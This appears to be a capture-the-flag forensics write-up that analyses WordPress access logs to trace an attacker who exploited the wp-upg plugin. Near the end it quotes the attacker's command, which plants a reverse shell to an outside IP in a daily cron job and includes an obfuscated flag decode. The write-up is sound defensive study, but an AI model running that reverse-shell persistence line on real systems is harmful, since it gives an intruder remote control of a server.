# Explanation
We are given the following file:
* `access.log`: Wordpress server logs.

In the log file, notice there are several requests related to a WordPress website. By slowly analyzing the logs, `82.179.92.206` has performed the most requests out of the IP addresses, indicating a suspicious activity.
<br><br>
Another way is to utilize a command to find the amount of times an IP addresses was involved by the number of requests (command is from HTB write-up).
```
cat access.log | cut -d " " -f 1 | sort | uniq -c
```

<p align='center'>
  <img src='/images/logs2.png' alt="VirusTotal">
</p>

* `cut -d " " -f 1`: The cut command splits each line of the log file into fields using a space (" ") as the delimiter. It then extracts the first field (the IP address) from each line. This isolates the IP addresses from the log entries.
* `sort`: Sorts the extracted IP addresses in ascending order.
* `uniq -c`: Counts the number of unique occurrences of each unique IP address.

# Solution
By reading the instructions, they mentioned that the attacker may have exploited a vulnerability in a plugin. 
Hence, the search can be easier by filtering the logs using "wp-content/plugins/" which is the directory storing all the plugins. Requests from 82.179.92.206 with response status code of 200 are the key to identifying the vulnerability, as these can reveal whether the attacker's attempts were successful. 

By analyzing the logs, notice how some requests suggest that the attacker has exploited the `wp-upg` plugin since the plugin was responding with 200 OK messages. Additionally, `wp-upg` has certain vulnerabilities such as CVE-2022-4060 and CVE-2023-0039

<p align='center'>
  <img src='/images/logs1.png' alt="VirusTotal">
</p>

After identifying the vulnerable plugin, the logs are analyzed further and another important log was found. These requests indicate the attacker was attempting to execute arbitrary commands on the system.

<p align='center'>
  <img src='/images/logs3.png' alt="VirusTotal">
</p>

One of the requests creates a cron job named `testconnect` that connects to a Command and Control (CnC) server and prints the flag.

<p align='center'>
  <img src='/images/logs4.png' alt="VirusTotal">
</p>

<p align='center'>
  <img src='/images/logs6.png' alt="VirusTotal">
</p>

At this point, I was stuck and required help from the HTB writeup. I found out that to retrieve the flag was to decode the URL using the `testconnect` cron job again. This can be done using the command:

```
echo "sh -i >& /dev/tcp/82.179.92.206/7331 0>&1" > /etc/cron.daily/testconnect && Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo $Mz$Tz$Vz$az$Kz$Oz|base64 -d|rev
```

<p align='center'>
  <img src='/images/logs5.png' alt="VirusTotal">
</p>
